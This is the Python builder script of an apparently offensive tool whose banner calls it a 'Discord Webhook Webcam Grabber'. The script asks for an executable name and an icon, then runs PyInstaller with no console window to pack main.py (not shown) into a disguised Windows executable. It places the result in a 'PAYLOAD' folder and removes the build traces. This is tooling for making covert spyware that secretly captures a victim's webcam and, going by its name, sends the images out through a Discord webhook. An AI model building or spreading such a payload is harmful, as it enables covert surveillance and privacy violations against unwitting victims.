import os
import shutil
from PIL import Image
from io import BytesIO
from pystyle import Colorate, Colors

def serpent():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Colorate.Horizontal(Colors.red_to_yellow,r"""
                         __
           ---_ ...... _/_ -
          /  .      ./ .'*\ \
          : '         /__-'   \.
         /                      )
       _/                  >   .'
     /   .   .       _.-" /  .'
     \           __/"     /.'/|
       \ '--  .-" /     //' |\|
        \|  \ | /     //_ _ |/|
         `.  \:     //|_ _ _|\|
         | \/.    //  | _ _ |/| 
          \_ | \/ /    \ _ _ \\\
              \__/      \ _ _ \|\
                              
----------------------------------------------       
[SERPENT] Discord Webhook Webcam Grabber Tool
[VERSION] V1.0
[CREATED] github.com/madanokr001
[REVOLT!] https://rvlt.gg/1wYFKwme
          """))

def convert(image_path):
    try:
        img = Image.open(image_path) 
        icon_path = "icon.ico"
        img.save(icon_path, "ICO") 
        return icon_path
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_white,"FAILD."))
        return None

def build():
    icon_path = convert(icon)  
    if icon_path is None:
        print(Colorate.Horizontal(Colors.red_to_white,"FAILD."))
        return

    os.system(f'pyinstaller --onefile --clean --name {exe} --icon {icon_path} --noconsole main.py')

    exepath = f"dist/{exe}.exe"
    lib = "PAYLOAD"

    if not os.path.exists(lib):
        os.makedirs(lib)

    if os.path.exists(exepath):
        shutil.copy(exepath, os.path.join(lib, f"{exe}.exe"))

    if os.path.exists("dist"):
        shutil.rmtree("dist")
    if os.path.exists("build"):
        shutil.rmtree("build")
    if os.path.exists(f"{exe}.spec"):
        os.remove(f"{exe}.spec")

    if os.path.exists(icon_path):
        os.remove(icon_path)

    print(Colorate.Horizontal(Colors.yellow_to_red,"[SERPENT] > PAYLOAD"))

if __name__ == "__main__":
    serpent()
    exe = input(Colorate.Horizontal(Colors.red_to_yellow,"""
[SERPENT] ENTER THE EXE FILE NAME        
┌──(root@SERPENT)-[/home/root]
└─# """))

    icon = input(Colorate.Horizontal(Colors.red_to_yellow,"""
[SERPENT] ENTER THE ICON IMAGE FILE PATH (LOCAL FILE PATH)
┌──(root@SERPENT)-[/home/root]
└─# """))
    
    build()

